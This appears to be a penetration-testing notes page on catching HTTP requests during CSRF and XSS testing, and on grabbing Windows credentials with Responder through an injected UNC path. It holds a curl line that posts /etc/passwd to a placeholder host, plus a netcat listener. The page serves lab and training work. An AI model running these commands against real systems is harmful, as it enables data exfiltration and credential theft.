# Request Grabber

<div class="row row-cols-lg-2"><div>

During pentesting activies, we may want to catch HTTP requests, such as during a CSRF attack or a XSS attack.

If our machine is network accessible, we can use `nc`:

```shell!
$ nc -lnvp PORT
<send request to YOUR_PUBLIC_IP:PORT>
```

Otherwise, we may use online public solutions.
</div><div>

For instance, we can use API Testing Platforms:

* [requestbin](https://public.requestbin.com/r/) <small>(HTTP 🌍)</small>
* [postbin](https://www.toptal.com/developers/postbin/) <small>(HTTP 🌍)</small>
* [ngrok](https://ngrok.com/) <small>(HTTP 🌍 and TCP ⭐, account required 🪦)</small>
* [requestinspector](https://requestinspector.com/) <small>(HTTP 🌍)</small>
* ...

```ps
$ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
```
</div></div>

<hr class="sep-both">

## Additional tools

<div class="row row-cols-lg-2"><div>

#### Responder

[![server_side_attacks](../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![attacking_common_services](../../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![return](../../../_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)

You can use [responder](https://github.com/lgandx/Responder) <small>(5.0k ⭐)</small> to catch Windows authentication requests allowing us to grab hashes and passwords.

For instance, a website may be using SMB to access some shares based on the user input. If we inject a share leading to our machine, we may be able to grab the credentials used to connect to the share.

```ps
$ sudo responder -i IP -I tun0
```

In the previous example, if we inject `//YOUR_IP/anything`. If the website was configured to use the current user credentials to connect to the share, then you will receive them, and will have to crack them.

📚 It works with SMB, LDAP, etc.
</div><div>
</div></div>